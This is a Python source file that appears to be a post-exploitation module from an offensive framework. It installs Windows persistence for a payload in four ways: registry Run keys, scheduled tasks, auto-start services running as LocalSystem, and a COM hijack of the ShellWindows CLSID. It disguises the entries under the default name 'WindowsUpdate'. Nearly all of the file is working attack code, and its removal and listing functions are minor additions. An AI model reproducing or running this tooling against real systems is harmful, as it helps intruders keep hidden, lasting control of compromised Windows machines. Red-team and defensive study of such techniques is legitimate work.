"""Windows persistence via registry Run keys, scheduled tasks, services, COM hijacking.

Supports four persistence methods:
  run_key        — HKCU/HKLM Run key (winreg; no admin needed for HKCU)
  scheduled_task — schtasks.exe (subprocess; onlogon trigger by default)
  service        — sc.exe create + start (admin required)
  com_hijack     — HKCU InprocServer32 CLSID override (winreg; no admin needed)

Args accepted by run():
  method       — run_key | scheduled_task | service | com_hijack (default: run_key)
  action       — install | remove | list  (default: install)
  name         — entry name / task name / service name  (default: WindowsUpdate)
  payload_path — path to the executable or DLL on the target
  hive         — HKCU | HKLM  (default: HKCU, run_key only)
  trigger      — onlogon | onstart | minute  (default: onlogon, scheduled_task only)
  run_as       — user/SYSTEM to run task as  (scheduled_task only)
  clsid        — GUID string to hijack  (default: ShellWindows, com_hijack only)
  dll_path     — DLL path for COM hijack (falls back to payload_path)

Detection / removal:
  Run key:        reg query / reg delete
  Scheduled task: schtasks /query, /delete
  Service:        sc query, sc delete
  COM hijack:     reg query "HKCU\\Software\\Classes\\CLSID"
"""

from __future__ import annotations

import subprocess
from typing import Any

from post.base import ModuleResult, PostModule
from post.loader import register

# ── Optional winreg (stdlib on Windows only) ───────────────────────────────────

try:
    import winreg as _winreg
    _WINREG_OK = True
except ImportError:
    _winreg = None      # type: ignore[assignment]
    _WINREG_OK = False

_RUN_KEY     = r"Software\Microsoft\Windows\CurrentVersion\Run"
_RUNONCE_KEY = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"

_HIVE_MAP: dict[str, Any] = {}
if _WINREG_OK:
    _HIVE_MAP = {
        "HKCU": _winreg.HKEY_CURRENT_USER,
        "HKLM": _winreg.HKEY_LOCAL_MACHINE,
    }


def _resolve_hive(hive_str: str) -> Any:
    return _HIVE_MAP.get(hive_str.upper(), _winreg.HKEY_CURRENT_USER if _WINREG_OK else None)


# ── run_key back-end ───────────────────────────────────────────────────────────

def _winreg_unavailable_error(alt_cmd: str = "") -> ModuleResult:
    msg = "winreg not available (requires Windows)."
    if alt_cmd:
        msg += f" Alternatively, run via shell task: {alt_cmd}"
    return ModuleResult(ok=False, output="", error=msg)


def _run_key_install(name: str, payload_path: str, hive_str: str = "HKCU") -> ModuleResult:
    if not _WINREG_OK:
        alt = (
            f'reg add "HKCU\\{_RUN_KEY}" /v {name} '
            f'/t REG_SZ /d "{payload_path}" /f'
        )
        return _winreg_unavailable_error(alt)
    hive = _resolve_hive(hive_str)
    key_path = f"{hive_str}\\{_RUN_KEY}\\{name}"
    try:
        key = _winreg.OpenKey(hive, _RUN_KEY, 0, _winreg.KEY_SET_VALUE)
        _winreg.SetValueEx(key, name, 0, _winreg.REG_SZ, payload_path)
        _winreg.CloseKey(key)
        return ModuleResult(
            ok=True,
            output=f"[run_key] Installed: {key_path} → {payload_path}",
            data={"method": "run_key", "action": "install", "key": key_path, "value": payload_path},
        )
    except OSError as exc:
        return ModuleResult(ok=False, output="", error=f"Registry write failed: {exc}")


def _run_key_remove(name: str, hive_str: str = "HKCU") -> ModuleResult:
    if not _WINREG_OK:
        alt = f'reg delete "HKCU\\{_RUN_KEY}" /v {name} /f'
        return _winreg_unavailable_error(alt)
    hive = _resolve_hive(hive_str)
    try:
        key = _winreg.OpenKey(hive, _RUN_KEY, 0, _winreg.KEY_SET_VALUE)
        _winreg.DeleteValue(key, name)
        _winreg.CloseKey(key)
        return ModuleResult(
            ok=True,
            output=f"[run_key] Removed: {hive_str}\\{_RUN_KEY}\\{name}",
            data={"method": "run_key", "action": "remove", "name": name},
        )
    except OSError as exc:
        return ModuleResult(ok=False, output="", error=f"Registry delete failed: {exc}")


def _run_key_list(hive_str: str = "HKCU") -> ModuleResult:
    if not _WINREG_OK:
        alt = f'reg query "HKCU\\{_RUN_KEY}"'
        return _winreg_unavailable_error(alt)
    hive = _resolve_hive(hive_str)
    entries: list[dict] = []
    try:
        key = _winreg.OpenKey(hive, _RUN_KEY, 0, _winreg.KEY_READ)
        i = 0
        while True:
            try:
                vname, value, _ = _winreg.EnumValue(key, i)
                entries.append({"name": vname, "value": value})
                i += 1
            except OSError:
                break
        _winreg.CloseKey(key)
    except OSError as exc:
        return ModuleResult(ok=False, output="", error=f"Registry read failed: {exc}")
    lines = [f"Run key entries ({hive_str}\\{_RUN_KEY}):"]
    for e in entries:
        lines.append(f"  {e['name']} → {e['value']}")
    if not entries:
        lines.append("  (no entries)")
    return ModuleResult(
        ok=True,
        output="\n".join(lines),
        data={"method": "run_key", "action": "list", "entries": entries},
    )


# ── scheduled_task back-end ────────────────────────────────────────────────────

def _schtask_install(
    name: str, payload_path: str, trigger: str = "onlogon", run_as: str = "",
) -> ModuleResult:
    cmd = ["schtasks", "/create", "/tn", name, "/tr", payload_path,
           "/sc", trigger, "/f"]
    if run_as:
        cmd += ["/ru", run_as]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        ok = r.returncode == 0
        output = (r.stdout + r.stderr).strip()
        return ModuleResult(
            ok=ok,
            output=f"[scheduled_task] {'Installed' if ok else 'Failed'}: {name} → {payload_path}\n{output}",
            data={"method": "scheduled_task", "action": "install",
                  "name": name, "payload": payload_path, "trigger": trigger},
            error="" if ok else f"schtasks failed ({r.returncode}): {output}",
        )
    except FileNotFoundError:
        return ModuleResult(ok=False, output="", error="schtasks.exe not found (requires Windows)")
    except subprocess.TimeoutExpired:
        return ModuleResult(ok=False, output="", error="schtasks timed out after 30 s")
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"schtasks error: {exc}")


def _schtask_remove(name: str) -> ModuleResult:
    try:
        r = subprocess.run(
            ["schtasks", "/delete", "/tn", name, "/f"],
            capture_output=True, text=True, timeout=30,
        )
        ok = r.returncode == 0
        output = (r.stdout + r.stderr).strip()
        return ModuleResult(
            ok=ok,
            output=f"[scheduled_task] {'Removed' if ok else 'Failed'}: {name}\n{output}",
            data={"method": "scheduled_task", "action": "remove", "name": name},
            error="" if ok else f"schtasks /delete failed: {output}",
        )
    except FileNotFoundError:
        return ModuleResult(ok=False, output="", error="schtasks.exe not found (requires Windows)")
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"schtasks error: {exc}")


def _schtask_list() -> ModuleResult:
    try:
        r = subprocess.run(
            ["schtasks", "/query", "/fo", "LIST"],
            capture_output=True, text=True, timeout=30,
        )
        output = r.stdout.strip()
        names = [
            line.split(":", 1)[1].strip()
            for line in output.splitlines()
            if line.lower().startswith("taskname:")
        ]
        return ModuleResult(
            ok=True,
            output=f"Scheduled tasks ({len(names)}):\n" + "\n".join(f"  {n}" for n in names),
            data={"method": "scheduled_task", "action": "list", "tasks": names},
        )
    except FileNotFoundError:
        return ModuleResult(ok=False, output="", error="schtasks.exe not found (requires Windows)")
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"schtasks error: {exc}")


# ── service back-end ───────────────────────────────────────────────────────────

def _service_install(name: str, payload_path: str) -> ModuleResult:
    try:
        r = subprocess.run(
            ["sc", "create", name, f"binpath={payload_path}", "start=auto", "obj=LocalSystem"],
            capture_output=True, text=True, timeout=30,
        )
        ok = r.returncode == 0
        output = (r.stdout + r.stderr).strip()
        if ok:
            subprocess.run(["sc", "start", name], capture_output=True, timeout=15)
        return ModuleResult(
            ok=ok,
            output=f"[service] {'Created' if ok else 'Failed'}: {name} → {payload_path}\n{output}",
            data={"method": "service", "action": "install", "name": name, "payload": payload_path},
            error="" if ok else f"sc create failed: {output}",
        )
    except FileNotFoundError:
        return ModuleResult(ok=False, output="", error="sc.exe not found (requires Windows)")
    except subprocess.TimeoutExpired:
        return ModuleResult(ok=False, output="", error="sc timed out")
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"sc error: {exc}")


def _service_remove(name: str) -> ModuleResult:
    try:
        subprocess.run(["sc", "stop", name], capture_output=True, timeout=15)
        r = subprocess.run(["sc", "delete", name], capture_output=True, text=True, timeout=30)
        ok = r.returncode == 0
        output = (r.stdout + r.stderr).strip()
        return ModuleResult(
            ok=ok,
            output=f"[service] {'Deleted' if ok else 'Failed'}: {name}\n{output}",
            data={"method": "service", "action": "remove", "name": name},
            error="" if ok else f"sc delete failed: {output}",
        )
    except FileNotFoundError:
        return ModuleResult(ok=False, output="", error="sc.exe not found (requires Windows)")
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"sc error: {exc}")


# ── com_hijack back-end ────────────────────────────────────────────────────────

def _com_hijack_install(clsid: str, dll_path: str) -> ModuleResult:
    if not _WINREG_OK:
        alt = (
            f'reg add "HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32" '
            f'/ve /t REG_SZ /d "{dll_path}" /f'
        )
        return _winreg_unavailable_error(alt)
    reg_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
    try:
        key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, reg_path)
        _winreg.SetValueEx(key, "", 0, _winreg.REG_SZ, dll_path)
        _winreg.SetValueEx(key, "ThreadingModel", 0, _winreg.REG_SZ, "Apartment")
        _winreg.CloseKey(key)
        return ModuleResult(
            ok=True,
            output=f"[com_hijack] Installed CLSID {clsid} → {dll_path}",
            data={"method": "com_hijack", "action": "install", "clsid": clsid, "dll": dll_path},
        )
    except OSError as exc:
        return ModuleResult(ok=False, output="", error=f"COM hijack registry write failed: {exc}")


def _com_hijack_remove(clsid: str) -> ModuleResult:
    if not _WINREG_OK:
        return _winreg_unavailable_error()
    sub_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
    top_path = f"Software\\Classes\\CLSID\\{clsid}"
    try:
        for path in (sub_path, top_path):
            try:
                _winreg.DeleteKey(_winreg.HKEY_CURRENT_USER, path)
            except OSError:
                pass
        return ModuleResult(
            ok=True,
            output=f"[com_hijack] Removed CLSID {clsid} from HKCU\\Software\\Classes\\CLSID",
            data={"method": "com_hijack", "action": "remove", "clsid": clsid},
        )
    except OSError as exc:
        return ModuleResult(ok=False, output="", error=f"COM hijack removal failed: {exc}")


# ── Module ─────────────────────────────────────────────────────────────────────

# Default CLSID — ShellWindows (popular for COM hijacking, per Bohops research)
_DEFAULT_CLSID = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"


@register
class RegistryPersistModule(PostModule):
    NAME        = "persist/registry"
    DESCRIPTION = "Windows Run key / scheduled task / service / COM hijack persistence"
    PLATFORM    = ["windows"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:  # noqa: C901
        args         = args or {}
        method       = args.get("method",       "run_key").strip().lower()
        action       = args.get("action",       "install").strip().lower()
        name         = args.get("name",         "WindowsUpdate").strip()
        payload_path = args.get("payload_path", "").strip()
        hive         = args.get("hive",         "HKCU").strip().upper()
        trigger      = args.get("trigger",      "onlogon").strip().lower()
        run_as       = args.get("run_as",       "").strip()
        clsid        = args.get("clsid",        _DEFAULT_CLSID).strip()
        dll_path     = args.get("dll_path",     payload_path).strip()

        # ── run_key ────────────────────────────────────────────────────────────
        if method == "run_key":
            if action == "install":
                if not payload_path:
                    return ModuleResult(ok=False, output="", error="Required: payload_path")
                return _run_key_install(name, payload_path, hive)
            elif action == "remove":
                return _run_key_remove(name, hive)
            elif action == "list":
                return _run_key_list(hive)
            else:
                return ModuleResult(
                    ok=False, output="",
                    error=f"Unknown action: {action!r}. Use: install, remove, list",
                )

        # ── scheduled_task ─────────────────────────────────────────────────────
        elif method == "scheduled_task":
            if action == "install":
                if not payload_path:
                    return ModuleResult(ok=False, output="", error="Required: payload_path")
                return _schtask_install(name, payload_path, trigger, run_as)
            elif action == "remove":
                return _schtask_remove(name)
            elif action == "list":
                return _schtask_list()
            else:
                return ModuleResult(
                    ok=False, output="",
                    error=f"Unknown action: {action!r}. Use: install, remove, list",
                )

        # ── service ────────────────────────────────────────────────────────────
        elif method == "service":
            if action == "install":
                if not payload_path:
                    return ModuleResult(ok=False, output="", error="Required: payload_path")
                return _service_install(name, payload_path)
            elif action == "remove":
                return _service_remove(name)
            else:
                return ModuleResult(
                    ok=False, output="",
                    error=f"Unknown action: {action!r}. Use: install, remove",
                )

        # ── com_hijack ─────────────────────────────────────────────────────────
        elif method == "com_hijack":
            if action == "install":
                if not dll_path:
                    return ModuleResult(ok=False, output="", error="Required: dll_path (or payload_path)")
                return _com_hijack_install(clsid, dll_path)
            elif action == "remove":
                return _com_hijack_remove(clsid)
            else:
                return ModuleResult(
                    ok=False, output="",
                    error=f"Unknown action: {action!r}. Use: install, remove",
                )

        else:
            return ModuleResult(
                ok=False, output="",
                error=(
                    f"Unknown method: {method!r}. "
                    "Choose: run_key, scheduled_task, service, com_hijack"
                ),
            )
